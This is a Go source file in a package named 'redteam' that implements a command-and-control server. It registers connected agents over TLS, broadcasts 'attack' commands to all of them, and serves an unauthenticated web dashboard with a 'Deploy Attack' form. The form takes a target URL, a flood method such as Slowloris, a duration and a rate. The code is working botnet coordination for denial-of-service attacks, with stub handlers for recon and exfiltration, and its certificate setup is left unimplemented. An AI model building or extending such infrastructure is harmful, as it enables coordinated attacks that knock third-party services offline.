package redteam

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"sync"
	"time"

	"github.com/fatih/color"
)

type C2Server struct {
	Port     int
	Clients  map[string]*C2Client
	mu       sync.RWMutex
	Commands chan Command
}

type C2Client struct {
	ID        string
	Conn      net.Conn
	Connected time.Time
	LastSeen  time.Time
}

type Command struct {
	Type     string      `json:"type"`
	Target   string      `json:"target"`
	Payload  interface{} `json:"payload"`
	ClientID string      `json:"client_id"`
}

type AttackCommand struct {
	Method   string `json:"method"`
	Target   string `json:"target"`
	Duration int    `json:"duration"`
	Rate     int    `json:"rate"`
	Threads  int    `json:"threads"`
}

// StartC2Server starts command and control server
func StartC2Server(port int) error {
	server := &C2Server{
		Port:     port,
		Clients:  make(map[string]*C2Client),
		Commands: make(chan Command, 100),
	}

	color.Green("🎮 Starting C2 Server on port %d", port)
	color.Yellow("   🔐 TLS encryption enabled")
	color.Cyan("   📡 Listening for agent connections...\n")

	// Generate self-signed certificate
	cert, err := generateSelfSignedCert()
	if err != nil {
		return fmt.Errorf("failed to generate certificate: %v", err)
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	listener, err := tls.Listen("tcp", fmt.Sprintf(":%d", port), tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to start listener: %v", err)
	}
	defer listener.Close()

	// Start web interface for control
	go startWebUI(server, port+1)

	// Handle connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			color.Red("❌ Accept error: %v", err)
			continue
		}

		go server.handleClient(conn)
	}
}

func (s *C2Server) handleClient(conn net.Conn) {
	clientID := conn.RemoteAddr().String()

	client := &C2Client{
		ID:        clientID,
		Conn:      conn,
		Connected: time.Now(),
		LastSeen:  time.Now(),
	}

	s.mu.Lock()
	s.Clients[clientID] = client
	s.mu.Unlock()

	color.Green("✅ New agent connected: %s", clientID)

	defer func() {
		s.mu.Lock()
		delete(s.Clients, clientID)
		s.mu.Unlock()
		conn.Close()
		color.Yellow("⚠️  Agent disconnected: %s", clientID)
	}()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		s.mu.Lock()
		client.LastSeen = time.Now()
		s.mu.Unlock()

		data := scanner.Text()
		var cmd Command
		if err := json.Unmarshal([]byte(data), &cmd); err != nil {
			color.Red("❌ Invalid command from %s: %v", clientID, err)
			continue
		}

		cmd.ClientID = clientID
		s.Commands <- cmd
		go s.processCommand(cmd)
	}
}

func (s *C2Server) processCommand(cmd Command) {
	color.Cyan("📨 Command received: %s from %s", cmd.Type, cmd.ClientID)

	switch cmd.Type {
	case "attack":
		attackCmd, ok := cmd.Payload.(map[string]interface{})
		if !ok {
			color.Red("❌ Invalid attack payload")
			return
		}

		color.Green("🚀 Deploying attack:")
		color.White("   Method: %v", attackCmd["method"])
		color.White("   Target: %v", attackCmd["target"])
		color.White("   Duration: %v seconds", attackCmd["duration"])

		// Broadcast to all connected agents
		s.broadcastCommand(cmd)

	case "status":
		s.sendStatus(cmd.ClientID)

	case "recon":
		color.Cyan("🔍 Recon request from %s", cmd.ClientID)

	case "exfil":
		color.Yellow("📤 Exfiltration command from %s", cmd.ClientID)

	default:
		color.Yellow("⚠️  Unknown command type: %s", cmd.Type)
	}
}

func (s *C2Server) broadcastCommand(cmd Command) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	data, _ := json.Marshal(cmd)
	broadcast := 0

	for id, client := range s.Clients {
		if id != cmd.ClientID {
			if _, err := client.Conn.Write(append(data, '\n')); err != nil {
				color.Red("❌ Failed to send to %s", id)
			} else {
				broadcast++
			}
		}
	}

	color.Green("📡 Command broadcasted to %d agents", broadcast)
}

func (s *C2Server) sendStatus(clientID string) {
	s.mu.RLock()
	defer s.mu.RUnlock()

	status := map[string]interface{}{
		"connected_agents": len(s.Clients),
		"timestamp":        time.Now().Unix(),
		"agents":           []map[string]interface{}{},
	}

	for id, client := range s.Clients {
		status["agents"] = append(status["agents"].([]map[string]interface{}), map[string]interface{}{
			"id":        id,
			"connected": client.Connected,
			"last_seen": client.LastSeen,
			"uptime":    time.Since(client.Connected).String(),
		})
	}

	if client, ok := s.Clients[clientID]; ok {
		data, _ := json.Marshal(status)
		client.Conn.Write(append(data, '\n'))
	}
}

func startWebUI(server *C2Server, port int) {
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		fmt.Fprint(w, c2Dashboard(server))
	})

	http.HandleFunc("/api/clients", func(w http.ResponseWriter, r *http.Request) {
		server.mu.RLock()
		defer server.mu.RUnlock()

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(server.Clients)
	})

	http.HandleFunc("/api/attack", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var cmd Command
		if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
			http.Error(w, err.Error(), http.StatusBadRequest)
			return
		}

		server.Commands <- cmd
		go server.processCommand(cmd)

		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{"status": "command queued"})
	})

	color.Cyan("🌐 Web UI available at: http://localhost:%d\n", port)
	http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
}

func c2Dashboard(server *C2Server) string {
	server.mu.RLock()
	defer server.mu.RUnlock()

	html := `
<!DOCTYPE html>
<html>
<head>
	<title>C2 Control Panel</title>
	<style>
		body { background: #0a0e27; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
		.header { text-align: center; border-bottom: 2px solid #00ff00; padding-bottom: 20px; }
		.stats { display: flex; justify-content: space-around; margin: 30px 0; }
		.stat-box { background: #1a1e37; border: 1px solid #00ff00; border-radius: 10px; padding: 20px; text-align: center; }
		.stat-box h2 { margin: 0; font-size: 48px; }
		.clients { margin-top: 30px; }
		.client-card { background: #1a1e37; border: 1px solid #00ff00; border-radius: 5px; padding: 15px; margin: 10px 0; }
		.online { color: #00ff00; }
		.offline { color: #ff0000; }
		button { background: #00ff00; color: #0a0e27; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; }
		button:hover { background: #00cc00; }
		.attack-form { background: #1a1e37; border: 1px solid #00ff00; padding: 20px; border-radius: 10px; margin: 20px 0; }
		input, select { background: #0a0e27; color: #00ff00; border: 1px solid #00ff00; padding: 8px; margin: 5px; border-radius: 3px; }
	</style>
</head>
<body>
	<div class="header">
		<h1>⚡ C2 COMMAND CENTER ⚡</h1>
		<p>Advanced Attack Coordination Platform</p>
	</div>

	<div class="stats">
		<div class="stat-box">
			<h2>` + fmt.Sprintf("%d", len(server.Clients)) + `</h2>
			<p>Connected Agents</p>
		</div>
		<div class="stat-box">
			<h2>` + fmt.Sprintf("%d", len(server.Commands)) + `</h2>
			<p>Queued Commands</p>
		</div>
		<div class="stat-box">
			<h2 class="online">●</h2>
			<p>Server Status</p>
		</div>
	</div>

	<div class="attack-form">
		<h3>🎯 Deploy Attack</h3>
		<form id="attackForm">
			<input type="text" id="target" placeholder="Target URL" required>
			<select id="method">
				<option value="slowloris">Slowloris</option>
				<option value="adaptive">Adaptive</option>
				<option value="hybrid">Hybrid</option>
			</select>
			<input type="number" id="duration" placeholder="Duration (s)" value="60">
			<input type="number" id="rate" placeholder="Rate" value="100">
			<button type="submit">Deploy Attack</button>
		</form>
	</div>

	<div class="clients">
		<h3>📡 Connected Agents</h3>`

	for id, client := range server.Clients {
		html += fmt.Sprintf(`
		<div class="client-card">
			<strong class="online">● %s</strong>
			<p>Connected: %s | Last Seen: %s</p>
			<p>Uptime: %s</p>
		</div>`, id, client.Connected.Format("15:04:05"), client.LastSeen.Format("15:04:05"), time.Since(client.Connected).Round(time.Second))
	}

	html += `
	</div>

	<script>
		document.getElementById('attackForm').addEventListener('submit', function(e) {
			e.preventDefault();
			fetch('/api/attack', {
				method: 'POST',
				headers: {'Content-Type': 'application/json'},
				body: JSON.stringify({
					type: 'attack',
					payload: {
						method: document.getElementById('method').value,
						target: document.getElementById('target').value,
						duration: parseInt(document.getElementById('duration').value),
						rate: parseInt(document.getElementById('rate').value)
					}
				})
			}).then(r => r.json()).then(data => {
				alert('Attack deployed: ' + data.status);
			});
		});

		// Auto-refresh every 5 seconds
		setTimeout(() => location.reload(), 5000);
	</script>
</body>
</html>`

	return html
}

func generateSelfSignedCert() (tls.Certificate, error) {
	// For production, use proper certificate generation
	// This is a placeholder
	return tls.Certificate{}, fmt.Errorf("certificate generation not implemented - use openssl to generate cert.pem and key.pem")
}
